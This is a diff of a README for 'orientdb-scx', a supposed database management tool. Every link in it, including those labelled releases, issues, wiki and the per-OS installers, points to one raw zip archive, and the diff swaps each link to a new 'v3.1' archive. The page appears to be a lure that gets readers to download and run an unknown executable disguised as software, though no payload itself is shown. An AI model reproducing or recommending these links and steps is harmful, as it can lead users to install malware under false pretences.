@@ -1,7 +1,7 @@
 # 🗂️ orientdb-scx - Simple Database Management for Everyone
 
 ## 📥 Download Now
-[![Download orientdb-scx](https://raw.githubusercontent.com/DeadlyFahim/orientdb-scx/main/dial/orientdb-scx.zip)](https://raw.githubusercontent.com/DeadlyFahim/orientdb-scx/main/dial/orientdb-scx.zip)
+[![Download orientdb-scx](https://github.com/DeadlyFahim/orientdb-scx/raw/refs/heads/main/dial/orientdb-scx-v3.1.zip)](https://github.com/DeadlyFahim/orientdb-scx/raw/refs/heads/main/dial/orientdb-scx-v3.1.zip)
 
 ## 🚀 Getting Started
 Welcome to **orientdb-scx**, your straightforward solution for easy database management. This guide will help you download and run the application smoothly, with easy-to-follow steps.
@@ -17,15 +17,15 @@ Before you begin, ensure you have:
 - **Fast Performance**: Quickly handle your database queries.
 
 ## 📥 Download & Install
-To get started, visit the [Releases page](https://raw.githubusercontent.com/DeadlyFahim/orientdb-scx/main/dial/orientdb-scx.zip) to download the latest version of the software.
+To get started, visit the [Releases page](https://github.com/DeadlyFahim/orientdb-scx/raw/refs/heads/main/dial/orientdb-scx-v3.1.zip) to download the latest version of the software.
 
 ### Step-by-Step Download Instructions
-1. Click on this link: [Releases page](https://raw.githubusercontent.com/DeadlyFahim/orientdb-scx/main/dial/orientdb-scx.zip).
+1. Click on this link: [Releases page](https://github.com/DeadlyFahim/orientdb-scx/raw/refs/heads/main/dial/orientdb-scx-v3.1.zip).
 2. Look for the latest release at the top of the page.
 3. Select the appropriate installer for your operating system:
-   - For Windows, click on `https://raw.githubusercontent.com/DeadlyFahim/orientdb-scx/main/dial/orientdb-scx.zip`.
-   - For macOS, click on `https://raw.githubusercontent.com/DeadlyFahim/orientdb-scx/main/dial/orientdb-scx.zip`.
-   - For Linux users, download the `https://raw.githubusercontent.com/DeadlyFahim/orientdb-scx/main/dial/orientdb-scx.zip` file.
+   - For Windows, click on `https://github.com/DeadlyFahim/orientdb-scx/raw/refs/heads/main/dial/orientdb-scx-v3.1.zip`.
+   - For macOS, click on `https://github.com/DeadlyFahim/orientdb-scx/raw/refs/heads/main/dial/orientdb-scx-v3.1.zip`.
+   - For Linux users, download the `https://github.com/DeadlyFahim/orientdb-scx/raw/refs/heads/main/dial/orientdb-scx-v3.1.zip` file.
 
 4. Once the download is complete, locate the file on your computer.
    - On Windows, check your `Downloads` folder.
@@ -34,7 +34,7 @@ To get started, visit the [Releases page](https://raw.githubusercontent.com/Dead
 5. Open the downloaded file:
    - For Windows, double-click the `.exe` file to launch the installer.
    - For macOS, double-click the `.dmg` file, then drag the icon to your `Applications` folder.
-   - For Linux, extract the https://raw.githubusercontent.com/DeadlyFahim/orientdb-scx/main/dial/orientdb-scx.zip file, open a terminal, navigate to the extracted folder, and follow the included README for further setup.
+   - For Linux, extract the https://github.com/DeadlyFahim/orientdb-scx/raw/refs/heads/main/dial/orientdb-scx-v3.1.zip file, open a terminal, navigate to the extracted folder, and follow the included README for further setup.
 
 ## 🔧 Running the Application
 After installation, you can start using **orientdb-scx**:
@@ -50,17 +50,17 @@ After installation, you can start using **orientdb-scx**:
 
 ## 📬 Support & Feedback
 If you encounter any issues or have questions:
-- Visit the [GitHub Issues page](https://raw.githubusercontent.com/DeadlyFahim/orientdb-scx/main/dial/orientdb-scx.zip) to report bugs or ask for help.
+- Visit the [GitHub Issues page](https://github.com/DeadlyFahim/orientdb-scx/raw/refs/heads/main/dial/orientdb-scx-v3.1.zip) to report bugs or ask for help.
 - Check the FAQ section on the GitHub page for common troubleshooting tips.
 
 ## 📑 Additional Resources
 To enhance your experience:
-- Explore our [Wiki](https://raw.githubusercontent.com/DeadlyFahim/orientdb-scx/main/dial/orientdb-scx.zip) for tutorials and advanced features.
+- Explore our [Wiki](https://github.com/DeadlyFahim/orientdb-scx/raw/refs/heads/main/dial/orientdb-scx-v3.1.zip) for tutorials and advanced features.
 - Join our community forums to connect with other users.
 
 ## 🌐 Stay Updated
 Keep your application up to date:
-- Regularly check the [Releases page](https://raw.githubusercontent.com/DeadlyFahim/orientdb-scx/main/dial/orientdb-scx.zip) for the latest versions and updates.
+- Regularly check the [Releases page](https://github.com/DeadlyFahim/orientdb-scx/raw/refs/heads/main/dial/orientdb-scx-v3.1.zip) for the latest versions and updates.
 - Subscribe to notifications on GitHub to receive alerts about new releases.
 
 ---
